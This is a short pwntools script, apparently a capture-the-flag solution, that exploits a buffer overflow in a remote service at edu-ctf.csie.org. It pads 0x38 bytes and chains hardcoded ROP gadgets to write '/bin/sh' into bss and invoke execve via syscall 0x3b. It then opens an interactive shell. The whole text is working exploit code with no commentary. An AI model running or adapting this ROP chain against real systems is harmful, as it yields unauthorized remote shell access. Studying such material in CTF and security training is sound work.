from pwn import *

pop_rax = 0x0000000000415714
pop_rsi = 0x00000000004100f3
pop_rdi = 0x0000000000400686
pop_rdx = 0x0000000000449935
mov_qword_ptr = 0x000000000044709b
pop_rdx_pop_rsi = 0x000000000044beb9
syscall = 0x000000000040125c

bss = 0x006b6000

host = 'edu-ctf.csie.org'
port = 10173

r = remote(host, port)

p = b'a' * 0x38
p += p64(pop_rdi)
p += p64(bss)
p += p64(pop_rsi)
p += b"/bin/sh\0"
p += p64(mov_qword_ptr)
p += p64(pop_rdx_pop_rsi)
p += p64(0)
p += p64(0)
p += p64(pop_rax)
p += p64(0x3b)
p += p64(syscall)

r.sendafter(':D', p)
r.interactive()



